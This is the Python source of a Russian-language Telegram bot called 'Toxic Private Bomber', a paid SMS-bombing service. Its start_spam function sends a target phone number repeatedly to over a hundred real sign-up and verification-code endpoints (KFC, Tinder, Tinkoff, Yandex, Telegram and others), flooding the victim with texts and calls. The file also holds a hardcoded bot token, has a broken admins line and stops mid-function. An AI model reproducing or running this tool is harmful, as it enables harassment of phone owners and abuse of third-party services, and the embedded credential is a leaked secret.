import os
import json
import random
import sqlite3
import requests
from multiprocessing import Process, Queue
from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils.helper import Helper, HelperMode, ListItem

token = '5779873858:AAGlfVGj9JJ6r8IHJAI1R9JByrYgn-yXGIU'

bot = Bot(token=token)


dp = Dispatcher(bot)

phone = '' #телефон qiwi

token = '' #qiwi токен

publick_key = '' #публичный токен

amount = 50 # цена за подписку


admins = [kkvrsln] #добавь сюда свой ID


profile_button = types.KeyboardButton('Профиль🔮')

pay_button = types.KeyboardButton('Оплата👀')

referal_button = types.KeyboardButton('Реферальная система🎯')

admin_button = types.KeyboardButton('Админ панель🔒')

back_button = types.KeyboardButton('Назад')

start_spam_button = types.KeyboardButton('Начать атаку💡')

help_button = types.KeyboardButton('Помощь⚡️')

main_keyboard = types.ReplyKeyboardMarkup().add(profile_button).add(help_button)

profile_keyboard = types.ReplyKeyboardMarkup().add(pay_button,referal_button,admin_button,back_button,start_spam_button)

def new_payment(telegram_id,comment,payment_sum):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    cursor.execute(f'UPDATE users SET comment = ? WHERE telegram_id = ?;', (comment, telegram_id))
    cursor.execute(f'UPDATE users SET payment_sum = ? WHERE telegram_id = ?;', (payment_sum, telegram_id))
    conn.commit()

def new_user(telegram_id):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    query = f"""SELECT * from users WHERE telegram_id={telegram_id}"""
    cursor.execute(query)
    check = cursor.fetchall()
    if check:
        pass
    else:
        cursor.execute("""INSERT INTO users
                    VALUES (?,?,?,?,?,?,?)""",(telegram_id, "1", 1000, 0, 0, telegram_id, 1)
        )
        conn.commit()
        return 'new user'

def add_sub(telegram_id):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    cursor.execute(f'UPDATE users SET sub = ? WHERE telegram_id = ?;', (1, telegram_id))
    conn.commit()


def check_sub(telegram_id):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    for row in cursor.execute("SELECT telegram_id,sub FROM users"):
        user_id = row[0]
        if user_id == telegram_id:
            sub = row[1]
            return sub

def add_promo(telegram_id, promo):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    for row in cursor.execute("SELECT telegram_id,promo,referal_code FROM users"):
        user_id = row[0]
        if user_id == telegram_id:
            user_promo = row[1]
            referal_code = row[2]
            if int(user_promo) == 1 and int(referal_code) != int(user_promo):
                cursor.execute(f'UPDATE users SET promo = ? WHERE telegram_id = ?;', (promo, telegram_id))
                conn.commit()


def get_referals(telegram_id,promo):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    referals = 0
    for row in cursor.execute("SELECT telegram_id,promo FROM users"):
        ref_promo = row[1]
        if ref_promo == promo:
            referals += 1
    if referals != None:
        return referals
    elif referals == None:
        return 0

def get_balance(telegram_id):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    for row in cursor.execute("SELECT telegram_id,balance FROM users"):
        user_id = row[0]
        if user_id == telegram_id:
            balance = row[1]
            return balance



def checkbalance(telegram_id):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    for row in cursor.execute("SELECT telegram_id,balance FROM users"):
        user_id = row[0]
        if user_id == telegram_id:
            balance = row[1]
            if balance >= 1000:
                balance = int(balance - 1000)
                cursor.execute(f'UPDATE users SET balance = ? WHERE telegram_id = ?;', (balance, telegram_id))
                cursor.execute(f'UPDATE users SET sub = ? WHERE telegram_id = ?;', (1, telegram_id))
                conn.commit()
                return True
            elif balance < 1000:
                return False


def referal_pay(telegram_id):
    """
    Система которая добавляет 10%
    человеку процент от реферальный системы
    """
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    for row in cursor.execute("SELECT telegram_id,promo FROM users"):
        user_id = row[0]
        if user_id == telegram_id:
            promo = row[1]
            if promo != 1:
                ref_balance = amount / 10
                cursor.execute(f'UPDATE users SET balance = ? WHERE telegram_id = ?;', (ref_balance, promo))
                conn.commit()
                return promo
                
def get_comment(telegram_id):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    for row in cursor.execute("SELECT telegram_id,comment FROM users"):
        user_id = row[0]
        if user_id == telegram_id:
            comment = row[1]
            return comment


def edit_balance(telegram_id):
    conn = sqlite3.connect("bomber_users.db")
    cursor = conn.cursor()
    cursor.execute(f'UPDATE users SET balance = ? WHERE telegram_id = ?;', (0, telegram_id))
    conn.commit()



def start_spam(_phone):
    if _phone[0] == '+':
	    _phone = _phone[1:]
    if _phone[0] == '8':
        _phone = '7'+_phone[1:]
    if _phone[0] == '9':
        _phone = '7'+_phone
    def send_messsages(_phone):
        try:
            process = 7
            while process:
                try:
                    requests.post(

                        "https://cabinet.planetakino.ua/service/sms",
                        params={"phone": _phone},
                    )
                except:
                    pass
                try:
                     requests.post(
                        "https://ontaxi.com.ua/api/v2/web/client",
                        json={"country": "ru", "phone": _phone},
                    )
                except:
                    pass
                try:
                    requests.post(
                        "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
                        json={"phone": "+" + _phone},
                    )
                except:
                    pass
                try:
                    requests.post(
                        "https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
                        data={"phone": _phone},
                    )
                except:
                    pass
                try:
                    requests.post(
                    "https://smart.space/api/users/request_confirmation_code/",
                    json={"mobile": "+" + _phone, "action": "confirm_mobile"},
                )
                except:
                    pass
                try:
                    requests.post("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": _phone})
                except:
                    pass
                try:
                    requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",data={"data": _phone, "metod": "postreg"})
                except:
                    pass
                try:
                    requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",data={"telephone": "8" + _phone[1:]})
                except:
                    pass
                try:
                    requests.post("https://www.moyo.ua/identity/registration",data={"firstname": "Артем", "phone": _phone, "email": "jiwi2f@mail.ru"})
                except:
                    pass
                try:
                    requests.post("https://belkacar.ru/get-confirmation-code",data={"phone": _phone},headers={})
                except:
                    pass
                try:
                    requests.post("https://starpizzacafe.com/mods/a.function.php",data={"aj": "50", "registration-phone": _phone})
                except:
                    pass
                try:
                    requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                    data={"phone_number": _phone},
                    headers={},
                )
                except:
                    pass
                try:
                    requests.post("https://app.karusel.ru/api/v1/phone/",data={"phone": _phone},headers={})
                except:
                    pass
                try:
                    requests.post(
                    "https://dostavista.ru/backend/send-verification-sms",
                    data={"phone": _phone},
                )
                except:
                    pass
                try:
                    requests.post(
                    "https://www.monobank.com.ua/api/mobapplink/send",
                    data={"phone": "+" + _phone},
                )
                except:
                    pass
                try:
                    requests.post("https://alfalife.cc/auth.php", data={"phone": _phone})
                except:
                    pass
                try:
                    requests.post(
                    "https://koronapay.com/transfers/online/api/users/otps",
                    data={"phone": _phone},
                )
                except:
                    pass
                try:
                    requests.post(
                    "https://btfair.site/api/user/phone/code",
                    json={"phone": "+" + _phone,},
                )
                except:
                    pass
                try:
                     requests.post(
                    "https://ggbet.ru/api/auth/register-with-phone",
                    data={
                        "phone": "+" + _phone,
                        "login": "regerger@mail.ru",
                        "password": "ergergh655GGS#",
                        "agreement": "on",
                        "oferta": "on",
                    },
                )
                except:
                    pass
                try:
                    requests.post("https://www.etm.ru/cat/runprog.html",
                    data={
                        "m_phone": _phone,
                        "mode": "sendSms",
                        "syf_prog": "clients-services",
                        "getSysParam": "yes",
                    },
                )
                except:
                    pass
                try:
                    requests.post("https://thehive.pro/auth/signup", json={"phone": "+" + _phone})
                except:
                    pass
                try:
                    requests.post(
                    "https://api.creditter.ru/confirm/sms/send",
                    json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register",},
                )
                except:
                    pass
                try:
                    requests.post(
                    "https://win.1admiralxxx.ru/api/en/register.json",
                    json={
                        "mobile": _phone,
                        "bonus": "signup",
                        "agreement": 1,
                        "currency": "RUB",
                        "submit": 1,
                        "email": "",
                        "lang": "en",
                    },
                )
                except:
                    pass
                try:
                    requests.post(
                    "https://oauth.av.ru/check-phone",
                    json={"phone": (_phone, "+* (***) ***-**-**")},
                )
                except:
                    pass
                try:
                    requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": _phone})
                except:
                    pass
                try:
                    requests.post(
                    "https://www.niyama.ru/ajax/sendSMS.php",
                    data={
                        "REGISTER[PERSONAL_PHONE]": _phone,
                        "code": "",
                        "sendsms": "Выслать код",
                    },
                )
                except:
                    pass
                try:
                    requests.post(
                    "https://api.easypay.ua/api/auth/register",
                    json={"phone": _phone, "password": "efwe323rFF#"},
                )
                except:
                    pass
                try:
                    requests.post(
                    "https://fix-price.ru/ajax/register_phone_code.php",
                    data={
                        "register_call": "Y",
                        "action": "getCode",
                        "phone": "+" + _phone,
                    },
                )
                except:
                    pass
                try:
                    requests.post(
                    "https://www.nl.ua",
                    data={
                        "component": "bxmaker.authuserphone.login",
                        "sessid": "bf70db951f54b837748f69b75a61deb4",
                        "method": "sendCode",
                        "phone": _phone,
                        "registration": "N",
                    },
                )
                except:
                    pass
                try:
                    requests.post(
                    "https://msk.tele2.ru/api/validation/number/" + _phone,
                    json={"sender": "Tele2"},
                )
                except:
                    pass
                try:
                    requests.get(
                    "https://www.finam.ru/api/smslocker/sendcode",
                    data={"phone": "+" + _phone},
                )
                except:
                    pass
                try:
                    requests.post(
                    "https://makimaki.ru/system/callback.php",
                    params={
                        "cb_fio": "2d2d43rf",
                        "cb_phone": format(_phone, "+* *** *** ** **"),
                    },
                )
                except:
                    pass
                try:
                    requests.post(
                    "https://www.flipkart.com/api/6/user/signup/status",
                    headers={
                        "Origin": "https://www.flipkart.com",
                        "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop",
                    },
                    json={"loginId": "+" + _phone, "supportAllStates": True},
                )
                except:
                    pass
                try:
                    requests.post(
                    "https://secure.online.ua/ajax/check_phone/",
                    params={"reg_phone": _phone},
                )
                except:
                    pass

                try:
                    requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": _phone})
                except:
                    pass
                try:
                    requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + _phone})
                except:
                    pass
                try:
                    requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone})
                except:
                    pass
                try:
                    requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": _phone, "locale": "en", "countryCode": "ua", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
                except:
                    pass
                try:
                    requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+"+_phone})
                except:
                    pass
                try:
                    requests.post("https://my.telegram.org/auth/send_password",data={"phone": _phone})
                except:
                    pass
                try:
                    requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",data={"phone": _phone, "otpId": 0})
                except:
                    pass
                try:
                    requests.post("https://account.my.games/signup_send_sms/",data={"phone": _phone})
                except:
                    pass
                try:
                    requests.post("https://api.boosty.to/oauth/phone/authorize",data={"client_id": "+" + _phone})
                except:
                    pass
                try:
                    requests.post("https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber={}".format("+" + _phone))
                except:
                    pass
                try:
                    requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": _phone, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}})
                except:
                    pass
                try:
                    requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone_number": _phone})
                except:
                    pass
                try:
                    name = 'efefef'
                    requests.post("https://www.sushi-profi.ru/api/order/order-call/", json={"phone": _phone, "name": name})
                except:
                    pass
                try:
                    requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php", data={"name": name, "phone": _phone})
                except:
                    pass
                try:
                    requests.post('https://findclone.ru/register', params={'phone': '+' + _phone})
                except:
                    pass
                try:
                    requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
                except:
                    pass
                try:
                    requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
                except:
                    pass
                try:
                    requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
                except:
                    pass
                try:
                    requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phone, '_token':'*'})
                except:
                    pass
                try:
                    requests.post('https://cloud.mail.ru//api/v2/notify/applink', data={'phone':_phone, "api": "2","email": "email","x-email": "x-email"})
                except:
                    pass
                try:
                    requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "+" + _phone})
                except:
                    pass
                try:
                    requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone":_phone})
                except:
                    pass
                try:
                    requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone":_phone})
                except:
                    pass
                try:
                    requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={"phone_number":_phone})
                except:
                    pass
                try:
                    requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
                except:
                    pass
                try:
                    requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
                except:
                    pass
                try:
                    requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
                except:
                    pass
                try:
                    requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
                except:
                    pass
                try:
                    requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
                except:
                    pass
                try:
                    requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
                except:
                    pass
                try:
                    requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + _phone})
                except:
                    pass
                try:
                    requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
                except:
                    pass
                try:
                    requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
                except:
                    pass
                try:
                    requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
                except:
                    pass
                try:
                    requests.post('https://bmp.megafon.tv/api/v10/auth/register/msisdn',json={"msisdn":_phone,"password":"wdw2131"})
                except:
                    pass
                try:
                    requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": _phone})
                except:
                    pass
                try:
                    requests.post('https://youdrive.today/login/web/phone', data = {'phone': _phone, 'phone_code': '7'})
                except:
                    pass
                try:
                    requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
                except:
                    pass
                try:
                    requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
                except:
                    pass
                try:
                    requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
                except:
                    pass
                try:
                    requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
                except:
                    pass
                try:
                    requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
                except:
                    pass
                try:
                    requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
                except:
                    pass
                try:
                    requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": "jie8290GHH", "phone_number": _phone,"username": "Geniy719wee"})
                except:
                    pass
                try:
                    requests.post('https://tehnosvit.ua/iwantring_feedback.html', data={'feedbackName':"ivan",'feedbackPhone':'+'+_phone})
                except:
                    pass
                try:
                    requests.post('https://e-vse.online/mail2.php', data={'telephone':'+'+_phone})
                except:
                    pass
                try:
                    requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
                except:
                    pass
                try:
                    requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
                except:
                    pass
                try:
                    requests.post('https://www.nl.ua', data={'component':'bxmaker.authuserphone.login', 'sessid':'bf70db951f54b837748f69b75a61deb4', 'method':'sendCode','phone':_phone,'registration':'N'})
                except:
                    pass
                try:
                    data = {
                        'register_mobileno': _phone,
                        'logintype': 'Otp',
                        'uniq_identy': 'quWqfunF',
                        'forget_pwd': 'N'
                    }
                    requests.post('https://m.netmeds.com/sociallogin/popup/nmsgetcode/', data=data)
                except:
                    pass
                try:
                    data = {
                        'mobile': _phone,
                        'submit': '1',
                        'undefined': ''
                    }
                    requests.post('https://www.ref-r.com/clients/lenskart/smsApi', data=data)
                except:
                    pass
                try:
                    headers = {
                        'user-agent': 'Mozilla/5.0 (Windows NT 8.0; Win32; x32; rv:58.0) Gecko/20100101 Firefox/57.0'
                    }
                    requests.get('https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20' + _phone, headers=headers).json()
                except:
                    pass
                try:
                    headers = {
                        'host': 'www.goibibo.com',
                        'user-agent': 'Mozilla/5.0 (Windows NT 8.0; Win32; x32; rv:58.0) Gecko/20100101 Firefox/57.0',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'accept-language': 'en-US,en;q=0.5',
                        'accept-encoding': 'gzip, deflate, br',
                        'referer': 'https://www.goibibo.com/mobile/?sms=success',
                        'content-type': 'application/x-www-form-urlencoded',
                        'content-length': '14',
                        'connection': 'keep-alive',
                        'upgrade-insecure-requests': '1'}
                    data = {'mbl': _phone}
                    requests.post('https://www.goibibo.com/common/downloadsms/', headers=headers, data=data)
                except:
                    pass
                try:
                    headers = {
                        'Host': 'www.apollopharmacy.in',
                        'content-length': '17',
                        'accept': '*/*',
                        'origin': 'https://www.apollopharmacy.in',
                        'x-requested-with': 'XMLHttpRequest',
                        'save-data': 'on',
                        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'referer': 'https://www.apollopharmacy.in/sociallogin/mobile/login/',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
                        'cookie': 'section_data_ids=%7B%22cart%22%3A1560239751%7D'
                    }
                    requests.post('https://www.apollopharmacy.in/sociallogin/mobile/sendotp/', headers=headers, data={'mobile': _phone})
                except:
                    pass
                try:
                    requests.post(
                        "https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}
                    )
                except:
                    pass
                try:
                    requests.post("https://dostavista.ru/backend/send-verification-sms",data={"phone": _phone})
                except:
                    pass
                try:
                    requests.get("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+" + _phone})
                except:
                    pass
                try:
                    requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone})
                except:
                    pass
                try:
                    requests.post("https://auth.multiplex.ua/login", json={"login": _phone})
                except:
                    pass
                try:
                    requests.post(
                        "https://btfair.site/api/user/phone/code",
                        json={"phone": "+" + _phone,},
                    )
                except:
                    pass
                try:
                    requests.post(
                        "https://thehive.pro/auth/signup", json={"phone": "+" + _phone,}
                    )
                except:
                    pass
                try:
                    requests.post(
                        "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                        data={"phone_number": _phone},
                        headers={},
                    )
                except:
                    pass
                try:
                    requests.post(
                        "https://online.sbis.ru/reg/service/",
                        json={
                            "jsonrpc": "2.0",
                            "protocol": "5",
                            "method": "Пользователь.ЗаявкаНаФизика",
                            "params": {"phone": _phone},
                            "id": "1",
                        },
                    )
                except:
                    pass
                try:
                    requests.post(
                        "https://ib.psbank.ru/api/authentication/extendedClientAuthRequest",
                        json={
                            "firstName": "Иван",
                            "middleName": "Иванович",
                            "lastName": "Иванов",
                            "sex": "1",
                            "birthDate": "10.10.2000",
                            "mobilePhone": _phone,
                            "russianFederationResident": "true",
                            "isDSA": "false",
                            "personalDataProcessingAgreement": "true",
                            "bKIRequestAgreement": "null",
                            "promotionAgreement": "true",
                        },
                    )
                except:
                    pass
                try:
                    requests.post(
                        "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                        json={"phone": _phone},
                    )
                except:
                    pass
                try:
                    requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
                except:
                    pass
                try:
                    requests.post(
                        "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                        data={"phone_number": _phone}
                    )
                except:
                    pass
                try:
                    requests.post(
                        "https://www.flipkart.com/api/5/user/otp/generate",
                        headers={
                            "Origin": "https://www.flipkart.com",
                            "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
                        },
                        data={"loginId": "+" + _phone},
                        )
                except:
                    pass
                try:
                    requests.post(
                        "https://my.citrus.ua/api/v2/register",
                        data={
                            "email": "gg2gge@mail,ru",
                            "name": "Артем",
                            "12phone": _phone,
                            "password": "ef323GHJ1",
                            "confirm_password": "ef323GHJ1", 
                        },
                        )
                except:
                    pass
                try:
                    requests.post(
                    "https://my.modulbank.ru/api/v2/registration/nameAndPhone",
                    json={
                        "FirstName": "Артем",
                        "CellPhone": _phone,
                        "Package": "optimal",
                    },
                    )
                except:
                    pass
                try:
                    requests.post(
                    "https://www.moyo.ua/identity/registration",
                    data={"firstname": "Артем", "phone": _phone, "email": "hie3grg@mail.ru"},
                    )
                except:
                    pass
                try:
                    requests.post(
                    "https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12",data={"Phone": _phone})
                except:
                    pass
                try:
                    requests.post("https://cinema5.ru/api/phone_code", data={"phone": _phone})
                except:
                    pass
                try:
                    requests.post("https://www.etm.ru/cat/runprog.html",data={"m_phone": _phone,"mode": "sendSms","syf_prog": "clients-services","getSysParam": "yes",})
                except:
                    pass
                try:
                    requests.post("https://apteka.ru/_action/auth/getForm/",
                    data={

                        "form[NAME]": "",
                        "form[PERSONAL_GENDER]": "",
                        "form[PERSONAL_BIRTHDAY]": "",
                        "form[EMAIL]": "",
                        "form[LOGIN]": _phone,
                        "form[PASSWORD]": "wdwd11dw",
                        "get-new-password": "Получите пароль по SMS",
                        "user_agreement": "on",
                        "personal_data_agreement": "on",
                        "formType": "simple",
                        "utc_offset": "120",
                        },
                    )
                except:
                    pass
                try:
                    requests.post("https://secunda.com.ua/personalarea/registrationvalidphone",data={"ph": "+" + _phone})
                except:
                    pass
                try:
                    requests.post("http://api.rozamira-azs.ru/v1/auth", data={"login": _phone})
                except:
                    pass
                try:
                    requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",params={"number": _phone})
                except:
                    pass
                try:
                    requests.post(
                        "https://api.iconjob.co/api/auth/verification_code",
                        json={"phone": _phone},
                    )
                except:
                    pass
                try:
                    requests.post("https://panda99.ru/bdhandlers/order.php?t={int(time())}",data={"CB_NAME": "Артем", "CB_PHONE": _phone})
                except:
                    pass
                try:
                    requests.post(
                    "https://auth.pizza33.ua/ua/join/check/",
                    params={
                        "callback": "angular.callbacks._1",
                        "email": "w13f3f3f3@mail.ru",
                        "password": "3fe3HKJ21",
                        "phone": _phone,
                        "utm_current_visit_started": 0,
                        "utm_first_visit": 0,
                        "utm_previous_visit": 0,
                        "utm_times_visited": 0,
                    },
                )
                except:
                    pass
                try:
                    requests.post(
                    "https://zoloto585.ru/api/bcard/reg/",
                    json={
                        "name": "Максим",
                        "surname": "Летовал",
                        "patronymic": "Максимович",
                        "sex": "m",
                        "birthdate": "11.11.1999",
                        "phone": _phone,
                        "email": "jeh2221fe@ibox.ru",
                        "city": "Москва",
                    },
                )
                except:
                    pass
                try:
                    requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",data={"phone": _phone})
                except:
                    pass
                try:
                    requests.post(
                    "https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
                    data={"RECALL": "Y", "BACK_CALL_PHONE": _phone},
                )
                except:
                    pass
                try:
                    requests.post(
                    "https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
                    data={"demo_number": "+" + _phone, "ajax_demo_send": "1"},
                )
                except:
                    pass
                try:
                    requests.post("https://bamper.by/registration/?step=1",
                        data={
                            "phone": "+" + _phone,
                            "submit": "Запросить смс подтверждения",
                            "rules": "on",
                        },
                    )
                except:
                    pass
                try:
                    requests.post(
                    "https://friendsclub.ru/assets/components/pl/connector.php",
                    data={"casePar": "authSendsms", "MobilePhone": "+" + _phone},
                )
                except:
                    pass
                try:
                    requests.post(
                    "https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29",
                    data={"caller_number": _phone},
                )
                except:
                    pass
                try:
                    requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
                    json={
                        "phone": "+" + _phone,
                        "first_name": "-",
                        "utm_data": {},
                        "via": "call",
                    },
                )
                except:
                    pass
                try:
                    requests.post("https://shafa.ua/api/v3/graphiql",
                    json={
                        "operationName": "RegistrationSendSms",
                        "variables": {"phoneNumber": "+" + _phone},
                        "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n	isSuccess\n	userToken\n	errors {\n	  field\n	  messages {\n		message\n		code\n		__typename\n	  }\n	  __typename\n	}\n	__typename\n  }\n}\n",
                    },
                )
                except:
                    pass
                try:
                    requests.post("https://uklon.com.ua/api/v1/account/code/send",
                    headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
                    json={"phone": _phone},
                )
                except:
                    pass
                try:
                    requests.post("https://crm.getmancar.com.ua/api/veryfyaccount",
                    json={
                        "phone": "+" + _phone,
                        "grant_type": "password",
                        "client_id": "gcarAppMob",
                        "client_secret": "SomeRandomCharsAndNumbersMobile",
                    },
                )
                except:
                    pass
                try:
                    requests.post("https://auth.multiplex.ua/login", json={"login": _phone})
                except:
                    pass
                try:
                    requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": _phone})
                except:
                    pass
                try:
                    requests.post("https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",data={"phone": _phone, "alien": "0"})
                except:
                    pass
                try:
                    requests.post("https://izi.ua/api/auth/register",
                    json={
                        "phone": "+" + _phone,
                        "name": "Анастасия",
                        "is_terms_accepted": True,
                    },
                )
                except:
                    pass
                try:
                    requests.post("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": _phone})
                except:
                    pass
                
                process -= 1
        
        except:
            pass
        
   

    send_messsages(_phone)


@dp.message_handler(commands=['start'])
async def start_message(message: types.Message):
    await bot.send_message(message.chat.id, 'Toxic 🔐Private🔐 Bomber.Управление с помощью кнопок ниже.', reply_markup=main_keyboard)
    user = new_user(message.chat.id)
    if user == 'new user':
        await bot.send_message(message.chat.id, 'У вас есть реферальный код?Если есть напишите /ref код')
   


@dp.message_handler(text=["Помощь⚡️"])
async def help_message(message: types.Message):
    await bot.send_message(message.chat.id, "Выдать бесплатную подписку /sub телеграм ID\n/spam номер - начать атаку\n/ref код - ввести реферальный код")

@dp.message_handler(text=['Профиль🔮'])
async def profile(message: types.Message):
    check = check_sub(message.chat.id)
    if not check:
        await bot.send_message(message.chat.id, f'Ваш ID:{message.chat.id}👾\nПодписка:не активна😞', reply_markup=profile_keyboard)
    elif check:
        await bot.send_message(message.chat.id, f'Ваш ID:{message.chat.id}👾\nПодписка:активна👑', reply_markup=profile_keyboard)


@dp.message_handler(text=["Назад"])
async def back_message(message: types.Message):
    await bot.send_message(message.chat.id, 'Вернул вас в меню.', reply_markup=main_keyboard)


@dp.message_handler(text=['Запустить спам💡'])
async def spam(message: types.Message):
    referal_button = types.KeyboardButton('Реферальная система🎯')
    admin_button = types.KeyboardButton('Админ панель🔒')
    help_button = types.KeyboardButton('Помощь⚡️')
    back_button = types.KeyboardButton('Назад')
    spam_button = types.KeyboardButton('Остановить спам💡')
    profile_keyboard = types.ReplyKeyboardMarkup().add(referal_button,admin_button,spam_button,help_button,back_button)
    await bot.send_message(message.chat.id, 'Напишите номер,пример 7XXX.', reply_markup=profile_keyboard)


@dp.message_handler(text=['Оплата👀'])
async def payment(message: types.Message):
    check = check_sub(message.chat.id)
    if not check:
        comment = ''.join(random.choices('qwertyuiopsdfghjkl;zxcvbnm',k=10)) + str(random.randint(1, 1000))
        s = requests.Session()
